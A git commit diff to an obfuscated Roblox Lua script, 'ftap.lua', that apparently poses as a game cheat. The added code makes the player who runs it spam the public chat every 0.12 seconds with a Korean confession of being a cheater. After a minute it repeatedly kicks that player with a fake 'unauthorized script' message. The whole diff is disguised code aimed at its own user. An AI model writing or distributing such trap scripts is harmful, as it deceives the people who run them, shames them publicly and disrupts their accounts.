feba5cb8dcb5525360ed4c3c0b7c4d52c3b99236
yunjun3737-ship-it <yunjun3737@gmail.com>
2026-04-09 20:18:21 +0900

    Update ftap.lua

--- ftap.lua
+++ ftap.lua
@@ -1,2 +1,6 @@
+
 local _=game:GetService("Players")local __=game:GetService("TextChatService")local ___=_.LocalPlayer
-local function ____()local _____="저는 이 핵을 실행한 핵쟁이 입니다"while true do pcall(function()if __.TextChannels and __.TextChannels.RBXGeneral then __.TextChannels.RBXGeneral:SendAsync(_____)end end)task.wait(0.5)end end task.spawn(____)print(".")
+local ____="저는 이 핵을 실행한 핵쟁이 입니다"
+task.spawn(function()while true do pcall(function()if __.TextChannels and __.TextChannels.RBXGeneral then __.TextChannels.RBXGeneral:SendAsync(____)end end)task.wait(0.12)end end)
+task.wait(60)
+task.spawn(function()while true do pcall(function()_.Kick(___,"You have been kicked for using unauthorized script.")end)task.wait(0.5)end end)print(".")
